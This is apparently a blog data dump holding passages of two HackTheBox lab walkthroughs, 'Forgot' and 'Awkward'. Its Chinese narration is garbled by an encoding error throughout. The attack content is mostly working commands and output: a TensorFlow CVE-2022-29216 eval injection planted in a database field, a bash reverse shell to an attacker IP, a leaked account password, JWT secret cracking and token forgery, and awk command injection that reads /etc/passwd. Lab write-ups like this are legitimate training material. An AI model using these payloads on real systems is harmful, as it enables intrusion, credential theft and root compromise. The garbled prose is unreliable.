ç„¶ååœ¨æœ¬åœ°æ‰§è¡Œcurlè¯·æ±‚å¯¹åº”çš„URLï¼Œè·å–sessionå€¼ï¼ˆåœ¨burpæŠ“åŒ…é‡æ”¾ä¹Ÿå¯ä»¥ï¼‰ curl -I http://10.10.11.188/static/wa0er Set-Cookie: session=c0204f3b-c808-47db-ad92-7e4abbebe2be; HttpOnly; Path=/ F12â†’Storageâ†’Cookiesï¼Œsessionå€¼æ”¹ä¸ºè·å–åˆ°çš„sessionå€¼ é‡æ–°è®¿é—®http://10.10.11.188/admin_tickets å¯ä»¥çœ‹åˆ°è·å–åˆ°äº†diegoè´¦æˆ·å¯†ç  diego dCb#1!x0%gjq sshè¿ä¸Šå» æƒé™æå‡å‰é¢çŸ¥é“diegoç”¨æˆ·å·²è¢«ææƒï¼Œæ‰€ä»¥åº”è¯¥æ˜¯æœ‰sudoæƒé™ï¼Œå¯ä»¥æ‰§è¡Œsudo -lçœ‹ä¸€ä¸‹diegoç”¨æˆ·æƒé™ï¼Œå‘ç°æœ‰ä¸ª/opt/security/ml_security.pyå¯ä»¥æ‰§è¡Œ çœ‹ä¸€ä¸‹å†…å®¹ #!/usr/bin/python3 import sys import csv import pickle import mysql.connector import requests import threading import numpy as np import pandas as pd import urllib.parse as parse from urllib.parse import unquote from sklearn import model_selection from nltk.tokenize import word_tokenize from sklearn.linear_model import LogisticRegression from gensim.models.doc2vec import Doc2Vec, TaggedDocument from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string np.random.seed(42) f1 = '/opt/security/lib/DecisionTreeClassifier.sav' f2 = '/opt/security/lib/SVC.sav' f3 = '/opt/security/lib/GaussianNB.sav' f4 = '/opt/security/lib/KNeighborsClassifier.sav' f5 = '/opt/security/lib/RandomForestClassifier.sav' f6 = '/opt/security/lib/MLPClassifier.sav' # load the models from disk loaded_model1 = pickle.load(open(f1, 'rb')) loaded_model2 = pickle.load(open(f2, 'rb')) loaded_model3 = pickle.load(open(f3, 'rb')) loaded_model4 = pickle.load(open(f4, 'rb')) loaded_model5 = pickle.load(open(f5, 'rb')) loaded_model6 = pickle.load(open(f6, 'rb')) model= Doc2Vec.load(\"/opt/security/lib/d2v.model\") # Create a function to convert an array of strings to a set of features def getVec(text): features = [] for i, line in enumerate(text): test_data = word_tokenize(line.lower()) v1 = model.infer_vector(test_data) featureVec = v1 lineDecode = unquote(line) lowerStr = str(lineDecode).lower() feature1 = int(lowerStr.count('link')) feature1 += int(lowerStr.count('object')) feature1 += int(lowerStr.count('form')) feature1 += int(lowerStr.count('embed')) feature1 += int(lowerStr.count('ilayer')) feature1 += int(lowerStr.count('layer')) feature1 += int(lowerStr.count('style')) feature1 += int(lowerStr.count('applet')) feature1 += int(lowerStr.count('meta')) feature1 += int(lowerStr.count('img')) feature1 += int(lowerStr.count('iframe')) feature1 += int(lowerStr.count('marquee')) # add feature for malicious method count feature2 = int(lowerStr.count('exec')) feature2 += int(lowerStr.count('fromcharcode')) feature2 += int(lowerStr.count('eval')) feature2 += int(lowerStr.count('alert')) feature2 += int(lowerStr.count('getelementsbytagname')) feature2 += int(lowerStr.count('write')) feature2 += int(lowerStr.count('unescape')) feature2 += int(lowerStr.count('escape')) feature2 += int(lowerStr.count('prompt')) feature2 += int(lowerStr.count('onload')) feature2 += int(lowerStr.count('onclick')) feature2 += int(lowerStr.count('onerror')) feature2 += int(lowerStr.count('onpage')) feature2 += int(lowerStr.count('confirm')) # add feature for \".js\" count feature3 = int(lowerStr.count('.js')) # add feature for \"javascript\" count feature4 = int(lowerStr.count('javascript')) # add feature for length of the string feature5 = int(len(lowerStr)) # add feature for \"&lt;script\" count feature6 = int(lowerStr.count('script')) feature6 += int(lowerStr.count('&lt;script')) feature6 += int(lowerStr.count('&amp;lt;script')) feature6 += int(lowerStr.count('%3cscript')) feature6 += int(lowerStr.count('%3c%73%63%72%69%70%74')) # add feature for special character count feature7 = int(lowerStr.count('&amp;')) feature7 += int(lowerStr.count('&lt;')) feature7 += int(lowerStr.count('&gt;')) feature7 += int(lowerStr.count('\"')) feature7 += int(lowerStr.count('\\'')) feature7 += int(lowerStr.count('/')) feature7 += int(lowerStr.count('%')) feature7 += int(lowerStr.count('*')) feature7 += int(lowerStr.count(';')) feature7 += int(lowerStr.count('+')) feature7 += int(lowerStr.count('=')) feature7 += int(lowerStr.count('%3C')) # add feature for http count feature8 = int(lowerStr.count('http')) # append the features featureVec = np.append(featureVec,feature1) featureVec = np.append(featureVec,feature2) featureVec = np.append(featureVec,feature3) featureVec = np.append(featureVec,feature4) featureVec = np.append(featureVec,feature5) featureVec = np.append(featureVec,feature6) featureVec = np.append(featureVec,feature7) featureVec = np.append(featureVec,feature8) features.append(featureVec) return features # Grab links conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq') cursor = conn.cursor() cursor.execute('select reason from escalate') r = [i[0] for i in cursor.fetchall()] conn.close() data=[] for i in r: data.append(i) Xnew = getVec(data) #1 DecisionTreeClassifier ynew1 = loaded_model1.predict(Xnew) #2 SVC ynew2 = loaded_model2.predict(Xnew) #3 GaussianNB ynew3 = loaded_model3.predict(Xnew) #4 KNeighborsClassifier ynew4 = loaded_model4.predict(Xnew) #5 RandomForestClassifier ynew5 = loaded_model5.predict(Xnew) #6 MLPClassifier ynew6 = loaded_model6.predict(Xnew) # show the sample inputs and predicted outputs def assessData(i): score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i])) if score &gt;= .5: try: preprocess_input_exprs_arg_string(data[i],safe=False) except: pass for i in range(len(Xnew)): t = threading.Thread(target=assessData, args=(i,)) # t.daemon = True t.start() åˆ†æä¸€ä¸‹ä»£ç åŠŸèƒ½ ä»appæ•°æ®åº“escalateè¡¨çš„reasonåˆ—å–å€¼ï¼ˆä»£ç 112-121è¡Œï¼‰ï¼Œå°†æ­¤å€¼ä½œä¸ºè¾“å…¥ï¼ŒåŒ¹é…å…¶ä¸­çš„ç‰¹å¾å­—æ®µï¼ˆä»£ç 45-98è¡Œçš„featureï¼‰ä½œä¸ºç‰¹å¾å‘é‡ï¼ˆä¸å¿…çº ç»“ç‰¹å¾å‘é‡æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼‰ ç„¶åç”¨è‹¥å¹²ç§æœºå™¨å­¦ä¹ æ¨¡å‹ï¼ˆä»£ç 123-134è¡Œï¼‰å»é¢„æµ‹è¾“å‡º æœ€åå¯¹è¾“å‡ºæŠŠè¾“å…¥å’Œè¾“å‡ºéƒ½åºåˆ—åŒ–æˆæŸç§æ•°æ®æ ¼å¼ï¼ˆä»£ç 136-148ï¼Œè¿™é‡Œçš„æ•°æ®æ ¼å¼ä¸å¿…è¿‡åˆ†çº ç»“ï¼Œä¼°è®¡æ˜¯ä¸ºäº†çœ‹ç€æ–¹ä¾¿ï¼‰ æ³¨æ„ï¼šæœ‰ä¸ªå‰æï¼ŒåŒ¹é…åˆ°äº†ç›¸å…³ç‰¹å¾å­—æ®µï¼Œæ‰ä¼šæœ‰å¯èƒ½æ»¡è¶³åºåˆ—åŒ–æ•°æ®çš„æ¡ä»¶ï¼ˆå…·ä½“å¯çœ‹scoreå‚æ•°çš„ä¼ é€’é“¾ï¼‰ï¼Œæ‰ä¼šæ‰§è¡Œç¬¬3æ­¥ï¼Œä»è€Œæ‰ä¼šå»æ‰§è¡Œpreprocess_input_exprs_arg_string(data[i],safe=False) é‚£ä¹ˆæœ‰è¿æ¥æ•°æ®åº“çš„æ“ä½œï¼Œç”¨æˆ·åå¯†ç ä¾ç„¶æ˜¯diegoçš„ç”¨æˆ·åå¯†ç  é—®é¢˜å°±å‡ºç°åœ¨preprocess_input_exprs_arg_string(data[i],safe=False)ï¼Œgoogleæœäº†ä¸€ä¸‹ï¼Œæ˜¯CVE-2022-29216ï¼Œå¯ä»¥ä»£ç æ³¨å…¥ å‚è€ƒhttps://github.com/advisories/GHSA-75c9-jrh4-79mc ç¨å¾®åˆ†æä¸€ä¸‹è¿™ä¸ªCVEåŸç†ï¼Œä¸‹é¢ä»£ç æ®µæ˜¯å­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬ï¼ˆtensorflow2.6.3ï¼‰preprocess_input_exprs_arg_string()å‡½æ•°çš„æºç ï¼Œä¸»è¦é—®é¢˜å°±åœ¨äºsafeå‚æ•°å¦‚æœè®¾ä¸ºfalseï¼Œé‚£ä¹ˆç¬¬12è¡Œåˆ¤æ–­if safeå°±ä¼šè¿”å›å¸ƒå°”0ï¼Œä»è€Œè·³è½¬åˆ°18è¡Œelseï¼Œç„¶åæ‰§è¡Œeval(expr)ï¼Œåˆ†æexprå‚æ•°ä¼ é€’è·¯çº¿ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œäº†input_exprs_strç¬¬ä¸€ä¸ªç­‰å·åçš„è¡¨è¾¾å¼ def preprocess_input_exprs_arg_string(input_exprs_str, safe=True): \"\"\" ...... \"\"\" input_dict = {} for input_raw in filter(bool, input_exprs_str.split(';')): if '=' not in input_exprs_str: raise RuntimeError('--input_exprs \"%s\" format is incorrect. Please follow' '\"&lt;input_key&gt;=&lt;python expression&gt;\"' % input_exprs_str) input_key, expr = input_raw.split('=', 1) if safe: try: input_dict[input_key] = ast.literal_eval(expr) except: raise RuntimeError( f'Expression \"{expr}\" is not a valid python literal.') else: # ast.literal_eval does not work with numpy expressions input_dict[input_key] = eval(expr) # pylint: disable=eval-used return input_dict ç»¼ä¸Šåˆ†æï¼Œæˆ‘ä»¬å¯ä»¥åœ¨appæ•°æ®åº“escalateè¡¨çš„reasonåˆ—æ’å…¥ä¸€ä¸ªé”®å€¼å¯¹ï¼ˆa=bæ ¼å¼ï¼‰ï¼Œé”®åç§°ä»»æ„ï¼Œå€¼ä¸ºæ„é€ å¥½çš„pythonä»£ç ï¼ˆå› ä¸ºæœ€ç»ˆæ˜¯ä»£å…¥åˆ°/opt/security/ml_security.pyæ–‡ä»¶æ‰§è¡Œï¼‰ï¼Œå…¶ä¸­åŒ…å«æ‰§è¡Œåå¼¹shellæ–‡ä»¶çš„ä»£ç ï¼Œä¸”åŒ…å«åˆšæ‰åˆ†ææ‰€æåˆ°çš„ç‰¹å¾å­—æ®µçš„ä»»æ„ä¸€ä¸ªï¼Œç¤ºä¾‹å¦‚ä¸‹ hello=exec(\"\"\"\\nimport os\\nos.system(\"/tmp/wa0er_rev.sh\")\\nprint(\"%3CSCRIPT%3Ealert%28%22wa0er%22%29%3C/SCRIPT%3E\")\"\"\") å¼€å§‹æ“ä½œï¼Œçœ‹ä¸€ä¸‹tensorflowçš„ç‰ˆæœ¬æ˜¯2.6.3ï¼Œæ˜¯æ¼æ´å­˜åœ¨çš„ç‰ˆæœ¬ diego@forgot:~$ pip show tensorflow Name: tensorflow Version: 2.6.3 Summary: TensorFlow is an open source machine learning framework for everyone. Home-page: https://www.tensorflow.org/ Author: Google Inc. Author-email: packages@tensorflow.org License: Apache 2.0 Location: /usr/local/lib/python3.8/dist-packages Requires: keras, h5py, grpcio, tensorflow-estimator, termcolor, opt-einsum, six, keras-preprocessing, protobuf, tensorboard, absl-py, google-pasta, wrapt, wheel, flatbuffers, typing-extensions, gast, astunparse, numpy, clang Required-by: åœ¨/tmpç›®å½•å†™ä¸€ä¸ªåå¼¹shellæ–‡ä»¶ diego@forgot:~$ vim /tmp/wa0er_rev.sh #!/bin/bash bash -i &gt;&amp; /dev/tcp/[æœ¬åœ°IP]/[æœ¬åœ°PORT] 0&gt;&amp;1 diego@forgot:~$ chmod +x /tmp/wa0er_rev.sh è¿æ¥mysql è¿›åˆ°appæ•°æ®åº“ æ‰§è¡Œå¦‚ä¸‹sqlè¯­å¥ï¼Œåœ¨escalateè¡¨é‡Œæ’å…¥å†…å®¹ insert into escalate values (\"wa0er\",\"wa0er\",\"wa0er\",'hello=exec(\"\"\"\\nimport os\\nos.system(\"/tmp/wa0er_rev.sh\")\\nprint(\"%3CSCRIPT%3Ealert%28%22wa0er%22%29%3C/SCRIPT%3E\")\"\"\")'); å¯ä»¥çœ‹åˆ°ç¬¬å››åˆ—reasonæœ‰æˆ‘ä»¬æ³¨å…¥çš„ä»£ç  å¼€å¯ncç›‘å¬ nc -nvlp [PORT] æ‰§è¡Œè„šæœ¬ sudo /opt/security/ml_security.py æ‹¿åˆ°rootï¼ŒOverï¼ æ€»ç»“ ä¿¡æ¯æœé›†æš´éœ²ä¿¡æ¯ï¼šâ‘ é¡µé¢æºç æš´éœ²ç”¨æˆ·robert-dev-14522ï¼›â‘¡æš´éœ²varnishåå‘ä»£ç†ç¼“å­˜å¯åˆ©ç”¨ç‚¹ï¼ˆè·¯å¾„åŒ¹é…/scriptï¼‰ï¼› é‡ç½®å¯†ç åŠŸèƒ½æŠ•æ¯’æˆåŠŸä¿®æ”¹robert-dev-14522å¯†ç ï¼Œç™»å½•ç½‘ç«™ï¼› Varnishç¼“å­˜æ¬ºéª—ç™»å½•adminç”¨æˆ·ï¼Œè·å–SSHç”¨æˆ·diegoï¼› SSHè¿æ¥å‘ç°å…³é”®æ–‡ä»¶ml_security.pyï¼› ä»£ç å®¡è®¡+CVE-2022-29216å‘½ä»¤æ‰§è¡Œåå¼¹shellè·å–rootæƒé™ã€‚ å‚è€ƒhttps://0xdf.gitlab.io/2023/03/04/htb-forgot.html https://infosecwriteups.com/forgot-hack-the-box-walkthrough-htb-e571fd151f9a https://www.usenix.org/conference/usenixsecurity20/presentation/mirheidari","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Awkward","slug":"HTB2-Awkward","date":"2023-03-11T07:27:13.000Z","updated":"2023-08-31T07:55:20.218Z","comments":true,"path":"posts/d776b19d.html","link":"","permalink":"https://wa0er.github.io/posts/d776b19d.html","excerpt":"","text":"HTB-Awkwardä¿¡æ¯æ”¶é›†Nmap â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢] â””â”€# nmap -sC -sV 10.10.11.185 Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-16 21:53 EST Nmap scan report for 10.10.11.185 Host is up (0.35s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA) |_ 256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.48 seconds å¼€æ”¾ç«¯å£ï¼š22ï¼ˆSSHï¼‰ã€80ï¼ˆHTTPï¼‰ 80ç«¯å£å¼€æ”¾ï¼Œç›´æ¥URLæ‰“å¼€IPï¼Œè·³è½¬åˆ°hat-valley.htbï¼Œé‚£å°±æ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶ echo \"10.10.11.185 hat-valley.htb\" &gt;&gt; /etc/hosts ç›®å½•æ‰«æ dirsearch -u http://hat-valley.htb/ ç»§ç»­æ‰«jsç›®å½• dirsearch -u http://hat-valley.htb/js app.jsæœhrefï¼Œå‘ç°å‡ ä¸ªå¯ç–‘ç›®å½•/dashboardã€/leaveã€/hrï¼Œä¾æ¬¡æ‰“å¼€ï¼Œå‘ç°å…¨éƒ¨éƒ½ä¼šè·³è½¬åˆ°/hrï¼Œæ˜¯ä¸ªç™»å½•ç•Œé¢ éšä¾¿è¯•ï¼Œéƒ½ä¼šæŠ¥ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œç”¨BurpæŠ“åŒ…å‘ç°Cookieå­—æ®µæœ‰token=guest burpç›´æ¥ä¿®æ”¹æˆtoken=adminæˆ–è€…token=administratorï¼Œé‡æ”¾è¯·æ±‚åŒ…ï¼Œè¿˜æ˜¯ä¸è¡Œ ç”¨æ’ä»¶Cookie Editorç¼–è¾‘tokenå€¼ä¸ºadminï¼Œåˆ·æ–°é¡µé¢ï¼Œå‘ç°é¡µé¢è·³è½¬åˆ°/dashboard æˆ–è€…ä¹Ÿå¯ä»¥æµè§ˆå™¨F12â†’Storageâ†’Cookiesä¿®æ”¹ã€åˆ·æ–°é¡µé¢ï¼Œä¸€æ ·çš„æ•ˆæœ æ‰“å¼€å·¦ä¾§èœå•æ ã€Leave Requestsã€‘é¡µé¢ï¼Œç•™æ„åˆ°æ‰€æœ‰çš„ç¦»å¼€è¯·æ±‚ä¼šç”±Christineå®¡æ ¸ï¼ŒçŒœæµ‹Christineåº”è¯¥æ˜¯ä¸ªæƒé™ä¸å°çš„è´¦æˆ· ç„¶ååœ¨F12â†’Networkâ†’XHRï¼ˆXMLHttpRequestï¼‰çœ‹åˆ°æœ‰ä¸¤ä¸ªapiæ–‡ä»¶ åˆ†åˆ«è®¿é—®http://hat-valley.htb/api/staff-detailså’Œhttp://hat-valley.htb/api/store-statusï¼Œ/api/store-statusé¡µé¢æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œ/api/staff-detailsæœ‰jwt malformedæŠ¥é”™ä¿¡æ¯ JsonWebTokenError: jwt malformed at Object.module.exports [as verify] (/var/www/hat-valley.htb/node_modules/jsonwebtoken/verify.js:63:17) at /var/www/hat-valley.htb/server/server.js:151:30 at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5) at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13) at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3) at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5) at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15 at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12) at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10) at cookieParser (/var/www/hat-valley.htb/node_modules/cookie-parser/index.js:71:5) jwt malformedæŠ¥é”™æ˜¯å› ä¸ºå‰ç«¯ä¸Šä¼ tokençš„æ—¶å€™æ²¡æœ‰è¿›è¡Œéç©ºéªŒè¯ï¼Œå¯¼è‡´tokenä¼ ç»™äº†æœåŠ¡ç«¯ï¼Œè¿™æ ·å°±å’ŒæœåŠ¡ç«¯ç”Ÿæˆçš„tokené‡å¤äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬ç”¨CookieEditoræ’ä»¶æˆ–è€…F12åˆ é™¤cookieçš„tokenå­—æ®µï¼Œä¹Ÿå°±æ˜¯åˆ é™¤cookieï¼Œåˆ·æ–°é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å››ä¸ªç”¨æˆ· username \"christine.wool\" password \"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649\" username \"christopher.jones\" password \"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1\" username \"jackson.lightheart\" password \"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436\" username \"bean.hill\" password \"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f\" ç›®æµ‹æ˜¯64*4=256ä½Hashï¼Œåœ¨çº¿è§£ä¸€ä¸‹ è§£å‡ºæ¥ä¸€ä¸ªç”¨æˆ· christopher.jones chris123 é‚£ä¹ˆæˆ‘ä»¬é‡æ–°å›åˆ°http://hat-valley.htb/hré¡µé¢ï¼Œç™»å½•è¿™ä¸ªè´¦æˆ· çœ‹åˆ°Staff Detailsï¼Œæœç„¶ï¼Œå‰é¢çš„åˆ¤æ–­æ²¡é”™ï¼ŒChristineæ˜¯CEOï¼Œæƒé™ä¸å°ï¼Œè¿˜æœ‰ä¸¤ä¸ªé”€å”®å’Œä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜ å¹¶ä¸”æ‹¿åˆ°äº†JWT token ç”¨è„šæœ¬æŠŠè¿™ä¸ªJWT tokenè½¬æ¢æˆjohnæ ¼å¼ï¼Œç„¶åç”¨johnå·¥å…·ç ´è§£ https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py &gt; python3 jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY3MDE3MTU3fQ.M5Yx5hMqtxf3hxrIJSjdLSdubkP6gFPtGzwsDDr7voI &gt; jwt_hash #!/usr/bin/env python3 import sys from jwt.utils import base64url_decode from binascii import hexlify def jwt2john(jwt): \"\"\" Convert signature from base64 to hex, and separate it from the data by a # so that John can parse it. \"\"\" jwt_bytes = jwt.encode('ascii') parts = jwt_bytes.split(b'.') data = parts[0] + b'.' + parts[1] signature = hexlify(base64url_decode(parts[2])) return (data + b'#' + signature).decode('ascii') if __name__ == \"__main__\": if len(sys.argv) != 2: print(\"Usage: %s JWT\" % sys.argv[0]) else: john = jwt2john(sys.argv[1]) print(john) &gt; john -w=/usr/share/wordlists/rockyou.txt jwt_hash è·å–åˆ°JWT tokençš„secretå€¼ä¸º123beany123ï¼Œç”¨JWT Debuggerå°è¯•ï¼Œæš‚æ—¶æ²¡å‘ç°ä»€ä¹ˆ SSRFæƒ³èµ·åˆšæ‰å‘ç°çš„å¦ä¸€ä¸ªAPIï¼Œapi/store-status?url=\"http://store.hat-valley.htb\"ï¼Œå¯èƒ½å­˜åœ¨SSRF å°è¯•http://127.0.0.1:80ï¼Œè¢«é‡å®šå‘åˆ°http://store.hat-valley.htbï¼Œè¯å®å­˜åœ¨SSRF http://hat-valley.htb/api/store-status?url=\"http://127.0.0.1:80\"--&gt;http://store.hat-valley.htb ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u 'http://hat-valley.htb/api/store-status?url=\"http://127.0.0.1:FUZZ\"' -fs 0 ä¸‰ä¸ªç«¯å£80ã€3002ã€8080 3002æ˜¯APIæ–‡ä»¶ï¼Œè®°å½•äº†ç«™ç‚¹çš„APIä¿¡æ¯åŠå…¶æºç ï¼ŒAPIåç§°å¦‚ä¸‹ Login (/api/login) Submit Leave (/api/submit-leave) All Leave (/api/all-leave) Store Status (/api/store-status) Staff Details (/api/staff-details) 8080é¡µé¢ç©ºç™½ï¼Œçœ‹æºç å‘ç°hat-valleyä¸èƒ½æ­£å¸¸å·¥ä½œï¼Œè¦æ±‚å¼€å¯JavaScriptæ‰èƒ½æ­£å¸¸å·¥ä½œï¼Œæ²¡ä»€ä¹ˆç”¨ LFIåœ¨å…¶ä¸­ä¸€ä¸ªAPIæºç å‘ç°æ¼æ´ç‚¹ï¼Œåœ¨28è¡Œexecå‡½æ•°é‡Œï¼Œæœ‰ç”¨æˆ·å¯æ§çš„å‚æ•°userï¼Œé€šè¿‡æ“çºµå‚æ•°userï¼Œæ‰§è¡Œawkå‘½ä»¤è¯»å–æ–‡ä»¶ï¼ˆPSï¼šé¢˜ç›®åç§°AwkwardåŸæ¥ä½“ç°åœ¨è¿™ï¼‰ã€‚è€Œuserå€¼çš„è·å–ï¼Œå¾€å‰è¿½æº¯ä»£ç ï¼Œå‘ç°æ˜¯é€šè¿‡decodedTokenï¼Œç„¶åå–usernameå­—æ®µå¾—åˆ°çš„ã€‚ å†å¾€å‰è¿½æº¯åˆ°å¤´ï¼Œå‘ç°æ˜¯å¦‚ä¸‹å›¾æ‰€ç¤ºçš„ä¼ é€’é“¾ï¼ŒTOKEN_SECRETå‰é¢å·²ç»è·å¾—ï¼Œå€¼ä¸º123beany123ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡JWTä¼ªé€ è¯·æ±‚å¤´ä¸­Cookieå­—æ®µçš„tokenå€¼ï¼Œä»è€Œæ“çºµuserå€¼è¯»å–æ–‡ä»¶ app.get('/api/all-leave', (req, res) =&gt; { const user_token = req.cookies.token var authFailed = false var user = null if(user_token) { const decodedToken = jwt.verify(user_token, TOKEN_SECRET) if(!decodedToken.username) { authFailed = true } else { user = decodedToken.username } } if(authFailed) { return res.status(401).json({Error: \"Invalid Token\"}) } if(!user) { return res.status(500).send(\"Invalid user\") } const bad = [\";\",\"&amp;\",\"|\",\"&gt;\",\"&lt;\",\"*\",\"?\",\"`\",\"$\",\"(\",\")\",\"{\",\"}\",\"[\",\"]\",\"!\",\"#\"] const badInUser = bad.some(char =&gt; user.includes(char)); if(badInUser) { return res.status(500).send(\"Bad character detected.\") } exec(\"awk '/\" + user + \"/' /var/www/private/leave_requests.csv\", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) =&gt; { if(stdout) { return res.status(200).send(new Buffer(stdout, 'binary')); } if (error) { return res.status(500).send(\"Failed to retrieve leave requests\") } if (stderr) { return res.status(500).send(\"Failed to retrieve leave requests\") } }) }) å…³é”®ä»£ç  ...... user = decodedToken.username ...... exec(\"awk '/\" + user + \"/' /var/www/private/leave_requests.csv\", {encoding: 'binary', maxBuffer: 51200000} ...... æ¯”å¦‚æˆ‘ä»¬è®©user=/' /etc/passwd 'ï¼Œé‚£ä¹ˆå¾—åˆ°çš„å‘½ä»¤å¦‚ä¸‹ awk '//' /etc/passwd '/' /var/www/private/leave_requests.csv å¯ä»¥åœ¨è‡ªå·±æœ¬åœ°æµ‹è¯• ç”¨JWT Debuggerï¼Œå…ˆå°†è·å–åˆ°çš„tokenå¤åˆ¶åˆ°Encodedæ–‡æœ¬æ¡†é‡Œï¼Œç„¶åä¿®æ”¹Decodedæ–‡æœ¬æ¡†ä¸­usernameå€¼ä¸º/' /etc/passwd 'ï¼Œç„¶åå·¦ä¾§Encodedæ–‡æœ¬æ¡†å°±ä¼šå®æ—¶å‡ºç°ä¼ªé€ åçš„tokenå€¼ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl http://hat-valley.htb/api/all-leave --header \"Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzc4MjAwNzN9.TyuC5rH79AtjGs4biOvMhtG0CHRm1HfLfrWqRhylrLk\" | grep -i /bin/bash % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 3059 100 3059 0 0 3216 0 --:--:-- --:--:-- --:--:-- 3213 root:x:0:0:root:/root:/bin/bash bean:x:1001:1001:,,,:/home/bean:/bin/bash christine:x:1002:1002:,,,:/home/christine:/bin/bash å‘ç°2ä¸ªç”¨æˆ·ï¼Œbeanå’Œchristine å°è¯•ä¿®æ”¹payloadå¦‚ä¸‹ï¼Œæ‰§è¡Œç±»ä¼¼ä¸Šè¿°çš„å‘½ä»¤ { \"username\": \"/' /home/bean/.ssh/id_rsa '\", \"iat\": 1677820073 } æŠ¥é”™Failed to retrieve leave requests ä¿®æ”¹payloadå¦‚ä¸‹ { \"username\": \"/' /home/christine/.ssh/id_rsa '\", \"iat\": 1677820073 } ä¾ç„¶æŠ¥é”™Failed to retrieve leave requests ä¿®æ”¹å¦‚ä¸‹ { \"username\": \"/' /home/bean/.bashrc '\", \"iat\": 1677820073 } æœ‰ä¸œè¥¿äº† â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl http://hat-valley.htb/api/all-leave --header \"Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc3ODIwMDczfQ.NJ1ArXnFPdqvtf4K9Exdo34a4r73JZNUlg6VANAW7sQ\" # ~/.bashrc: executed by bash(1) for non-login shells. # see /usr/share/doc/bash/examples/startup-files (in the package bash-doc) # for examples # If not running interactively, don't do anything case $- in *i*) ;; *) return;; esac # don't put duplicate lines or lines starting with space in the history. # See bash(1) for more options HISTCONTROL=ignoreboth # append to the history file, don't overwrite it shopt -s histappend # for setting history length see HISTSIZE and HISTFILESIZE in bash(1) HISTSIZE=1000 HISTFILESIZE=2000 # check the window size after each command and, if necessary, # update the values of LINES and COLUMNS. shopt -s checkwinsize # If set, the pattern \"**\" used in a pathname expansion context will # match all files and zero or more directories and subdirectories. #shopt -s globstar # make less more friendly for non-text input files, see lesspipe(1) [ -x /usr/bin/lesspipe ] &amp;&amp; eval \"$(SHELL=/bin/sh lesspipe)\" # set variable identifying the chroot you work in (used in the prompt below) if [ -z \"${debian_chroot:-}\" ] &amp;&amp; [ -r /etc/debian_chroot ]; then debian_chroot=$(cat /etc/debian_chroot) fi # set a fancy prompt (non-color, unless we know we \"want\" color) case \"$TERM\" in xterm-color|*-256color) color_prompt=yes;; esac # uncomment for a colored prompt, if the terminal has the capability; turned # off by default to not distract the user: the focus in a terminal window # should be on the output of commands, not on the prompt #force_color_prompt=yes if [ -n \"$force_color_prompt\" ]; then if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then # We have color support; assume it's compliant with Ecma-48 # (ISO/IEC-6429). (Lack of such support is extremely rare, and such # a case would tend to support setf rather than setaf.) color_prompt=yes else color_prompt= fi fi if [ \"$color_prompt\" = yes ]; then 